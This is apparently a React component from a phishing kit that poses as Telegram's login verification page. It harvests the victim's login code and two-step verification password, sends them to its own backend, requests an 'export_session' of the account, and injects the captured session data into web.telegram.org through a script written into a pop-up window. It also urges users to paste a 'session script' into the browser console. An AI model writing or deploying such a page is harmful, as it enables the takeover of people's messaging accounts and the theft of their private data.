import React, { useState, useEffect } from "react";
import { api } from '../services/router';
import { useNavigate } from "react-router-dom";

const VerifyCode = () => {
    const [code, setCode] = useState('');
    const [phone, setPhone] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const [countdown, setCountdown] = useState(60);
    const [loginToken, setLoginToken] = useState("");
    const [show2FA, setShow2FA] = useState(false); // New state for 2FA prompt
    const [twoFAPassword, setTwoFAPassword] = useState(''); // New state for 2FA password
    const navigate = useNavigate();

    useEffect(() => {
        const storedPhone = localStorage.getItem("phone_number");
        if (storedPhone) {
            setPhone(storedPhone);
        } else {
            navigate('/');
        }

        const timer = setInterval(() => {
            setCountdown((prevCount) => {
                if (prevCount <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prevCount - 1;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, [navigate]);

    const handleInputChange = (e) => {
        const value = e.target.value.replace(/\D/g, '').substring(0, 5);
        setCode(value);
        if (value.length === 5) {
            handleVerification(value);
        }
    };

    const handleVerification = async (verificationCode) => {
        try {
            const userId = localStorage.getItem("user_id");
            if (!userId) {
                setError("Session expired. Please login again.");
                navigate('/');
                return;
            }

            const codeToSend = verificationCode || code;
            if (!/^\d{5}$/.test(codeToSend)) {
                setError("Please enter a valid 5-digit verification code");
                return;
            }

            setLoading(true);
            setError("");

            const data = { code: codeToSend, user_id: userId };
            console.log("Sending verification:", data);
            const verifyResponse = await api.post("/verify_code", data);
            console.log("Verify response:", verifyResponse.data);

            if (verifyResponse.data?.status === 200) {
                handleSuccessfulLogin(verifyResponse.data, userId);
            }
        } catch (error) {
            console.error("Verification error:", error);
            if (error.response?.status === 403) {
                console.log("Two-step verification required");
                setShow2FA(true);
            } else {
                setError(error.response?.data?.detail || "Verification failed. Please try again.");
            }
        } finally {
            setLoading(false);
        }
    };

    const handle2FASubmit = async () => {
        try {
            const userId = localStorage.getItem("user_id");
            if (!userId || !twoFAPassword) {
                setError("Please enter your two-step verification password");
                return;
            }

            setLoading(true);
            setError("");

            const data = { user_id: userId, password: twoFAPassword };
            console.log("Sending 2FA verification:", data);
            const twoFAResponse = await api.post(`/verify_2fa/${userId}`, data);
            console.log("2FA response:", twoFAResponse.data);

            if (twoFAResponse.data?.status === 200) {
                handleSuccessfulLogin(twoFAResponse.data, userId);
                setShow2FA(false);
                setTwoFAPassword('');
            }
        } catch (error) {
            console.error("2FA verification error:", error);
            setError(error.response?.data?.detail || "Invalid password. Please try again.");
        } finally {
            setLoading(false);
        }
    };

    const handleSuccessfulLogin = async (responseData, userId) => {
        const sessionData = responseData.session_data;
        const token = responseData.login_token;

        console.log("Session data received:", sessionData);
        console.log("Login token received:", token);

        localStorage.clear();
        localStorage.setItem("account1", JSON.stringify(sessionData));
        localStorage.setItem("login_token", token);
        setLoginToken(token);

        // Export session to Telegram
        try {
            await api.get(`/export_session/${userId}`);
            console.log("Session export requested");
        } catch (exportError) {
            console.error("Session export failed:", exportError);
            setError("Login successful, but session export failed. Use the manual link below.");
        }

        const telegramWebUrl = "https://web.telegram.org/k/";
        const loginScript = `
            localStorage.clear();
            localStorage.setItem("account1", '${JSON.stringify(sessionData)}');
            location.reload();
        `;

        const telegramWindow = window.open("", "_blank");
        if (telegramWindow) {
            telegramWindow.document.write(`
                <html>
                    <body>
                        <script>
                            window.location = "${telegramWebUrl}";
                            setTimeout(() => {
                                ${loginScript}
                            }, 1000);
                        </script>
                    </body>
                </html>
            `);
            telegramWindow.document.close();
            setError("Login initiated. If not logged in, use the manual link below or check your Telegram.");
        } else {
            console.warn("Popup blocked, falling back to current window");
            window.location.href = telegramWebUrl;
            setError("Popup blocked. Page redirected. If not logged in, refresh or use the manual link.");
        }
    };

    const handleResendCode = async () => {
        if (countdown > 0) return;

        try {
            setLoading(true);
            setError("");
            setCode('');

            const response = await api.post('/send_code', { phone_number: phone });
            if (response.data?.user_id) {
                localStorage.setItem('user_id', response.data.user_id);
                setCountdown(60);
                const timer = setInterval(() => {
                    setCountdown((prevCount) => {
                        if (prevCount <= 1) {
                            clearInterval(timer);
                            return 0;
                        }
                        return prevCount - 1;
                    });
                }, 1000);
            }
        } catch (err) {
            console.error("Resend code error:", err);
            setError(err.response?.data?.detail || "Failed to resend code.");
        } finally {
            setLoading(false);
        }
    };

    const handlePaste = async (e) => {
        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
        if (pastedText) {
            const digits = pastedText.replace(/\D/g, '').substring(0, 5);
            if (digits) {
                e.preventDefault();
                setCode(digits);
                if (digits.length === 5) {
                    setTimeout(() => handleVerification(digits), 0);
                }
            }
        }
    };

    return (
        <div className="min-h-screen bg-[#17212B] flex items-center justify-center p-4">
            <div className="w-full max-w-sm bg-[#232E3C] rounded-lg p-6 shadow-md">
                <div className="flex flex-col items-center">
                    <div className="w-16 h-16 bg-[#3390EC] rounded-full flex items-center justify-center mb-4">
                        <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="none">
                            <path d="M20 4L3 11L10 14M20 4L17 21L10 14M20 4L10 14" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                    </div>

                    <h1 className="text-xl font-bold text-white mb-2">
                        {show2FA ? "Two-Step Verification" : "Verification Code"}
                    </h1>

                    <div className="flex items-center gap-2 mb-4">
                        <p className="text-[#AAAAAA] text-base">{phone}</p>
                        <button 
                            onClick={() => navigate('/')}
                            className="text-[#3390EC] hover:text-[#5EACEF] text-sm"
                        >
                            Edit
                        </button>
                    </div>

                    {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

                    {!show2FA ? (
                        <>
                            <p className="text-[#AAAAAA] text-sm mb-4 text-center">
                                We've sent the code to the Telegram app on your phone
                            </p>

                            <div className="w-full mb-6">
                                <label className="block text-[#AAAAAA] text-sm mb-2">
                                    Verification Code
                                </label>
                                <div className="relative">
                                    <input
                                        type="text"
                                        value={code}
                                        onChange={handleInputChange}
                                        onPaste={handlePaste}
                                        disabled={loading}
                                        className="w-full bg-[#242F3D] text-white text-center text-lg tracking-widest rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-[#3390EC]"
                                        placeholder="•••••"
                                        autoFocus
                                        maxLength={5}
                                    />
                                </div>
                            </div>

                            <button
                                onClick={() => handleVerification()}
                                disabled={loading || code.length !== 5}
                                className={`w-full bg-[#3390EC] text-white py-3 rounded-lg hover:bg-[#5EACEF] transition-colors ${loading || code.length !== 5 ? 'opacity-50 cursor-not-allowed' : ''}`}
                            >
                                {loading ? 'Verifying...' : 'VERIFY'}
                            </button>

                            <button
                                onClick={handleResendCode}
                                disabled={countdown > 0 || loading}
                                className={`mt-4 text-sm ${countdown > 0 || loading ? 'text-[#666666] cursor-not-allowed' : 'text-[#3390EC] hover:text-[#5EACEF]'}`}
                            >
                                {countdown > 0 ? `Resend code in ${countdown}s` : 'Resend Code'}
                            </button>
                        </>
                    ) : (
                        <>
                            <p className="text-[#AAAAAA] text-sm mb-4 text-center">
                                Enter your two-step verification password
                            </p>

                            <div className="w-full mb-6">
                                <label className="block text-[#AAAAAA] text-sm mb-2">
                                    Password
                                </label>
                                <input
                                    type="password"
                                    value={twoFAPassword}
                                    onChange={(e) => setTwoFAPassword(e.target.value)}
                                    disabled={loading}
                                    className="w-full bg-[#242F3D] text-white rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-[#3390EC]"
                                    placeholder="••••••••"
                                    autoFocus
                                />
                            </div>

                            <button
                                onClick={handle2FASubmit}
                                disabled={loading || !twoFAPassword}
                                className={`w-full bg-[#3390EC] text-white py-3 rounded-lg hover:bg-[#5EACEF] transition-colors ${loading || !twoFAPassword ? 'opacity-50 cursor-not-allowed' : ''}`}
                            >
                                {loading ? 'Submitting...' : 'SUBMIT'}
                            </button>

                            <button
                                onClick={() => {
                                    setShow2FA(false);
                                    setTwoFAPassword('');
                                    setError('');
                                }}
                                className="mt-4 text-[#3390EC] hover:text-[#5EACEF] text-sm"
                            >
                                Cancel
                            </button>
                        </>
                    )}

                    {loginToken && (
                        <div className="mt-4 text-center">
                            <p className="text-[#AAAAAA] text-sm mb-2">Manual Login Link (if auto-login fails):</p>
                            <a
                                href={loginToken}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="text-[#3390EC] hover:text-[#5EACEF] text-sm break-all"
                            >
                                {loginToken}
                            </a>
                            <p className="text-[#AAAAAA] text-xs mt-2">
                                Or copy the session script from your Telegram and run it in the browser console (F12).
                            </p>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
};

export default VerifyCode;